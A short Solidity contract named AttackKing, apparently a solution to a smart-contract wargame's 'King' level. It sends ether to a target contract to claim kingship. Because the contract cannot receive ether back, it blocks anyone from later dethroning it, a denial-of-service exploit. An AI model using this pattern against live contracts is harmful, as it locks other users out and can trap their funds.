pragma solidity ^0.5.0;

contract AttackKing {
    function attack(address king) public payable {
        (bool result, bytes memory data) = king.call.value(msg.value)("");
        if (!result) revert();
    }

    // function() external payable {
    //     revert("Oops wont work");
    // }
}
